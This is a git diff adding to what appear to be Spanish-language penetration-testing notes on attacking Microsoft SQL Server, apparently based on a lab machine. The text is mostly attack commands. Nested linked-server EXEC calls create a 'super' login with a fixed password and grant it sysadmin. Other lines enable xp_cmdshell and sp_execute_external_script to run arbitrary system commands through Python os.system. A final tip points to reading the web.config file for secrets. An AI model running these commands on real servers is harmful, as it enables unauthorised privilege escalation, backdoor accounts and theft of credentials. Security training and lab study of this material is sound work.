@@ -44,3 +44,32 @@ EXEC ('EXEC (''EXEC sp_addlogin ''''super'''', ''''abc123!'''''') at [COMPATIBIL
 EXEC ('EXEC (''EXEC sp_addsrvrolemember ''''super'''', ''''sysadmin'''''') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
 #Con los dos comandos de arriba se esta creando un nuevo usuario llamado super con passw abc... y agregandolo a sysadmin
 -> Atencion! Hay 2 exec porque en el ejemplo se crea mediante queries en el servidor linkeado del linkeado
+
+
+###Ejecutar comandos de sistema
+enable_xp_cmdshell
+#Habilitar xp_cmdshell par ejecutar comando
+xp_cmdshell <comando>
+#Ejecutar comando
+xp_cmdshell icacls <path to file>
+#Leer archivo
+
+xp_cmdshell netstat -anop tcp
+#Equivalente al netstat de linux para ver los puertos del localhost
+-> Si en nuestro nmap no se muestran resultados qeu aca si, quiere decir que el firewall esta bloqueando las conexiones. En estos casos se debe probar realizando el escaneo con la ipv6
+xp_cmdshell ipconfig
+#Ver la configuraciones IP de la maquina
+
+EXECUTE sp_configure 'sp_execute_external_script',1;
+#mas info en https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql?view=sql-server-ver15
+RECONFIGURE
+sp_execute_external_script @language = N'language', @script = N'script';
+#El lenguaje puede ser Python y en script puede haber un print("Hello world").
+#De esta forma si se nos devuelve el print sabremos que podemos ejecutar comandos de esta forma.
+
+EXEC sp_execute_external_script @language = N'Python', @script = N'import os; os.system("whoami");';
+#Usando python tenemos un ejemplo donde se ejecuta el import de la libreria os y, a continuacion, el comando whoami con dicha libreria.
+-> En este punto el comando whoami puede ser remplazado con cualquier comando cmd para poder ir investigando el sistema
+-> En un servidor ISS windows es importante leer el archivo C:\inetpub\wwwroot\web.config
+
+
